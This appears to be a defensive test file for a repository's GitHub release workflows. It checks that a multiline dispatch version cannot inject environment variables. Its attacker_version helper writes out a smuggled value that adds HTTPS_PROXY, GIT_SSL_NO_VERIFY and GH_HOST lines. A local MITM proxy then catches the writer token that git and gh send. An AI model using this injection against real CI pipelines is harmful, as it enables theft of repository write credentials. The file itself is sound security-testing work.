#!/usr/bin/env python3
"""Spec for the release-workflow environment-file injection.

These tests fail while a dispatch version can extend the job environment
after the writer token is minted. They pass once a version that is not a
single line is rejected before anything is written to the environment file.

Run:
  python3 .github/workflows/release_writer_env_injection_test.py
"""

from __future__ import annotations

import base64
import os
import re
import socket
import ssl
import subprocess
import tempfile
import threading
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
RELEASE_PR = REPO / ".github" / "workflows" / "release-pr.yml"
BUMP_VERSION = REPO / ".github" / "workflows" / "bump-version.yml"

# Obvious placeholder. This is not a credential.
WRITER_TOKEN = "placeholder-writer-token"
RELEASE_LINE = "12.0.0"

# actions/runner v2.338.2 FileCommandManager.cs SetEnvFileCommand only skips
# this name. Proxy and host variables are applied.
ENV_BLOCKLIST = ("NODE_OPTIONS",)


def extract_run_scripts(text: str) -> list[str]:
    """Return the bodies of run steps. Mirrors the script text the runner
    writes to a file before invoking the shell (ScriptHandler.cs)."""
    lines = text.splitlines()
    scripts: list[str] = []
    i = 0
    while i < len(lines):
        line = lines[i]
        block = re.match(r"^(\s*)-\s+run:\s*\|[+-]?\s*(?:#.*)?$", line)
        if block:
            key_indent = len(block.group(1))
            i += 1
            body: list[str] = []
            while i < len(lines):
                nxt = lines[i]
                if nxt.strip() == "":
                    body.append("")
                    i += 1
                    continue
                indent = len(nxt) - len(nxt.lstrip(" "))
                if indent <= key_indent:
                    break
                body.append(nxt)
                i += 1
            indents = [len(b) - len(b.lstrip(" ")) for b in body if b.strip()]
            cut = min(indents) if indents else 0
            scripts.append("\n".join(b[cut:] if len(b) >= cut else b for b in body) + "\n")
            continue
        inline = re.match(r"^\s*-\s+run:\s*(\S.*)$", line)
        if inline:
            scripts.append(inline.group(1) + "\n")
        i += 1
    return scripts


def script_containing(path: Path, marker: str) -> str:
    matches = [s for s in extract_run_scripts(path.read_text()) if marker in s]
    if len(matches) != 1:
        raise AssertionError(f"{path} has {len(matches)} run steps containing {marker!r}")
    return matches[0]


def run_step(script: str, env: dict[str, str]) -> tuple[int, Path]:
    """Run a workflow run step the way the Linux runner does.

    ScriptHandler.cs resolves bash and ScriptHandlerHelpers.cs supplies `-e`
    for the default shell. The script text is not rewritten for bash.
    """
    work = Path(tempfile.mkdtemp(prefix="release-env-"))
    env_file = work / "github_env"
    env_file.write_text("")
    script_file = work / "step.sh"
    script_file.write_text(script)
    step_env = os.environ.copy()
    for key in (
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "http_proxy",
        "https_proxy",
        "ALL_PROXY",
        "all_proxy",
        "NO_PROXY",
        "no_proxy",
        "GIT_SSL_NO_VERIFY",
        "GH_HOST",
        "GH_TOKEN",
        "GITHUB_TOKEN",
        "GH_ENTERPRISE_TOKEN",
        "GITHUB_ENTERPRISE_TOKEN",
        "REQUEST_METHOD",
    ):
        step_env.pop(key, None)
    step_env.update(env)
    step_env["GITHUB_ENV"] = str(env_file)
    step_env["HOME"] = str(work)
    step_env["GIT_TERMINAL_PROMPT"] = "0"
    completed = subprocess.run(
        ["bash", "-e", str(script_file)],
        cwd=work,
        env=step_env,
        capture_output=True,
        text=True,
    )
    return completed.returncode, env_file


def parse_env_file(path: Path) -> dict[str, str]:
    """Parse GITHUB_ENV the way actions/runner v2.338.2 does on Linux.

    FileCommandManager.cs EnvFileKeyValuePairs.GetEnumerator / ReadLine,
    then SetEnvFileCommand skips ENV_BLOCKLIST case-insensitively and stores
    every other pair. A later pair replaces an earlier one.
    """
    text = path.read_text() if path.exists() else ""
    index = 0
    parsed: dict[str, str] = {}

    def read_line() -> tuple[str | None, str | None]:
        nonlocal index
        if index >= len(text):
            return None, None
        original = index
        lf = text.find("\n", index)
        if lf < 0:
            index = len(text)
            return text[original:], None
        index = lf + 1
        return text[original:lf], "\n"

    line, _newline = read_line()
    while line is not None:
        if line != "":
            equals = line.find("=")
            heredoc = line.find("<<")
            if equals >= 0 and (heredoc < 0 or equals < heredoc):
                key, _, value = line.partition("=")
            elif heredoc >= 0 and (equals < 0 or heredoc < equals):
                key, _, delimiter = line.partition("<<")
                if key == "" or delimiter == "":
                    break
                start = index
                end = index
                temp, newline = read_line()
                while temp != delimiter:
                    if temp is None or newline is None:
                        break
                    end = index - len(newline)
                    temp, newline = read_line()
                value = text[start:end] if end > start else ""
            else:
                break
            if not any(key.lower() == blocked.lower() for blocked in ENV_BLOCKLIST):
                parsed[key] = value
        line, _newline = read_line()
    return parsed


def attacker_version(https_proxy: str, http_proxy: str) -> str:
    # One dispatch value. The first line is a real release number so the
    # branch name built from it stays that release. Further lines are
    # assignments the environment-file parser accepts.
    return "\n".join(
        [
            RELEASE_LINE,
            f"HTTPS_PROXY={https_proxy}",
            "GIT_SSL_NO_VERIFY=true",
            f"HTTP_PROXY={http_proxy}",
            "GH_HOST=github.localhost",
        ]
    )


class ProxyCapture:
    def __init__(self) -> None:
        self.chunks: list[bytes] = []
        self._ready = threading.Event()
        self._done = threading.Event()
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self.port = 0

    def start(self) -> None:
        self._thread.start()
        if not self._ready.wait(timeout=5):
            raise RuntimeError("proxy did not bind")

    def finish(self) -> None:
        self._thread.join(timeout=8)

    def saw_token(self) -> bool:
        blob = b"".join(self.chunks)
        if WRITER_TOKEN.encode() in blob:
            return True
        basic = base64.b64encode(f"x-access-token:{WRITER_TOKEN}".encode())
        return basic in blob

    def _serve(self) -> None:
        raise NotImplementedError


class PlainProxy(ProxyCapture):
    """Records the request a client sends to an HTTP proxy and answers it."""

    def _serve(self) -> None:
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("127.0.0.1", 0))
        server.listen(1)
        server.settimeout(8)
        self.port = server.getsockname()[1]
        self._ready.set()
        try:
            conn, _addr = server.accept()
        except TimeoutError:
            server.close()
            self._done.set()
            return
        conn.settimeout(3)
        try:
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 65536:
                part = conn.recv(4096)
                if not part:
                    break
                data += part
            self.chunks.append(data)
            if data.startswith(b"CONNECT"):
                conn.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
                conn.settimeout(2)
                try:
                    self.chunks.append(conn.recv(4096))
                except TimeoutError:
                    pass
            else:
                conn.sendall(
                    b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                )
        finally:
            conn.close()
            server.close()
            self._done.set()


class MitmProxy(ProxyCapture):
    """Terminates CONNECT and records the decrypted HTTP request."""

    def _serve(self) -> None:
        certdir = Path(tempfile.mkdtemp(prefix="mitm-"))
        key = certdir / "key.pem"
        cert = certdir / "cert.pem"
        subprocess.run(
            [
                "openssl",
                "req",
                "-x509",
                "-newkey",
                "rsa:2048",
                "-keyout",
                str(key),
                "-out",
                str(cert),
                "-days",
                "1",
                "-nodes",
                "-subj",
                "/CN=github.com",
            ],
            check=True,
            capture_output=True,
        )
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert, key)
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("127.0.0.1", 0))
        server.listen(1)
        server.settimeout(8)
        self.port = server.getsockname()[1]
        self._ready.set()
        try:
            conn, _addr = server.accept()
        except TimeoutError:
            server.close()
            self._done.set()
            return
        conn.settimeout(5)
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                part = conn.recv(4096)
                if not part:
                    break
                data += part
            self.chunks.append(data)
            if not data.startswith(b"CONNECT"):
                return
            conn.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
            tls = context.wrap_socket(conn, server_side=True)
            tls.settimeout(3)
            request = b""
            while b"\r\n\r\n" not in request and len(request) < 65536:
                part = tls.recv(4096)
                if not part:
                    break
                request += part
            self.chunks.append(request)
            tls.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            tls.close()
        except ssl.SSLError:
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass
            server.close()
            self._done.set()


def checkout_fetch(env: dict[str, str]) -> None:
    """The fetch actions/checkout v5 performs with the writer token.

    git-auth-helper.ts sets http.<origin>/.extraheader to basic auth for
    x-access-token, and git-command-manager.ts passes the process environment
    through to git. The process environment is the job environment after
    GITHUB_ENV has been applied (StepsRunner.cs merges it before the step).
    """
    basic = base64.b64encode(f"x-access-token:{WRITER_TOKEN}".encode()).decode()
    header = f"AUTHORIZATION: basic {basic}"
    subprocess.run(
        [
            "git",
            "-c",
            f"http.https://github.com/.extraheader={header}",
            "ls-remote",
            "https://github.com/grafana/grafana.git",
            "HEAD",
        ],
        env=env,
        cwd=env["HOME"],
        capture_output=True,
        text=True,
        timeout=15,
    )


def gh_create_ref(env: dict[str, str]) -> None:
    """The gh api call in the pre-create-branch step.

    That step's own env block sets GH_TOKEN to the writer token. StepsRunner.cs
    applies that block after the job environment, so it replaces an injected
    GH_TOKEN and leaves every other injected variable in place.
    """
    step_env = dict(env)
    step_env["GH_TOKEN"] = WRITER_TOKEN
    step_env["GH_CONFIG_DIR"] = env["HOME"]
    subprocess.run(
        [
            "gh",
            "api",
            "repos/grafana/grafana/git/refs",
            "--method",
            "POST",
            "-f",
            "ref=refs/heads/release/1/12.0.0",
            "-f",
            "sha=0123456789abcdef0123456789abcdef01234567",
        ],
        env=step_env,
        cwd=env["HOME"],
        capture_output=True,
        text=True,
        timeout=15,
    )


def exercise(env: dict[str, str], include_checkout: bool) -> tuple[bool, bool]:
    """Point the proxy variables the workflow wrote at local listeners.

    The listeners stand in for the host named in the dispatch value. They
    record the bytes the real git and gh clients send and do not forward.
    """
    mitm = MitmProxy()
    plain = PlainProxy()
    mitm.start()
    plain.start()
    if "HTTPS_PROXY" in env:
        env["HTTPS_PROXY"] = f"http://127.0.0.1:{mitm.port}"
    if "HTTP_PROXY" in env:
        env["HTTP_PROXY"] = f"http://127.0.0.1:{plain.port}"
    try:
        if include_checkout:
            checkout_fetch(env)
        gh_create_ref(env)
    finally:
        mitm.finish()
        plain.finish()
    return mitm.saw_token(), plain.saw_token()


class ReleaseWriterEnvInjectionTest(unittest.TestCase):
    def test_release_pr_single_line_version_sets_branch_names(self) -> None:
        script = script_containing(RELEASE_PR, 'RELEASE_BRANCH=release-${VERSION}')
        code, env_file = run_step(
            script,
            {"VERSION": RELEASE_LINE, "RUN_NUMBER": "7"},
        )
        parsed = parse_env_file(env_file)
        self.assertEqual(code, 0)
        self.assertEqual(parsed["RELEASE_BRANCH"], "release-12.0.0")
        self.assertEqual(parsed["WORK_BRANCH"], "release/7/12.0.0")

    def test_release_pr_dispatch_version_cannot_redirect_writer_token(self) -> None:
        script = script_containing(RELEASE_PR, 'RELEASE_BRANCH=release-${VERSION}')
        self.assert_token_stays_put(
            script,
            {"RUN_NUMBER": "7"},
            include_checkout=True,
            allowed_keys={"RELEASE_BRANCH", "WORK_BRANCH"},
        )

    def test_bump_version_dispatch_version_cannot_redirect_writer_token(self) -> None:
        script = script_containing(BUMP_VERSION, 'WORK_BRANCH=bump-version/${RUN_ID}/${VERSION}')
        self.assert_token_stays_put(
            script,
            {"RUN_ID": "7"},
            include_checkout=False,
            allowed_keys={"WORK_BRANCH"},
        )

    def assert_token_stays_put(
        self,
        script: str,
        extra_env: dict[str, str],
        include_checkout: bool,
        allowed_keys: set[str],
    ) -> None:
        # The listener ports are chosen inside exercise. The version only has
        # to carry a proxy URL so the workflow writes the assignment; exercise
        # retargets that URL at the listener before any client runs.
        version = attacker_version("http://127.0.0.1:9", "http://127.0.0.1:9")
        code, env_file = run_step(script, {"VERSION": version, **extra_env})
        parsed = parse_env_file(env_file)
        raw = env_file.read_text() if env_file.exists() else ""

        # ActionRunner.cs applies the environment file in a finally block, and
        # a step that exits 0 lets the later credential steps run. The file
        # must not contain the attacker's assignments in either case.
        forbidden = ("HTTPS_PROXY", "HTTP_PROXY", "GIT_SSL_NO_VERIFY", "GH_HOST")
        present = sorted(set(parsed) - allowed_keys)
        if not present:
            present = [key for key in forbidden if f"{key}=" in raw]
        values_with_newlines = [
            key for key, value in parsed.items() if "\n" in value or "\r" in value
        ]

        checkout_saw = False
        api_saw = False
        if code == 0 and present:
            job_env = {
                "HOME": str(env_file.parent),
                "PATH": os.environ["PATH"],
                "GIT_TERMINAL_PROMPT": "0",
            }
            job_env.update(parsed)
            checkout_saw, api_saw = exercise(job_env, include_checkout)

        problems: list[str] = []
        if code == 0:
            problems.append("multiline version was accepted")
        if present:
            problems.append(
                "dispatch version extended the job environment: " + ", ".join(present)
            )
        if values_with_newlines:
            problems.append(
                "environment values still contain a newline: " + ", ".join(values_with_newlines)
            )
        if checkout_saw:
            problems.append("checkout sent the writer token to the injected proxy")
        if api_saw:
            problems.append("gh api sent the writer token to the injected proxy")
        self.assertEqual(problems, [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
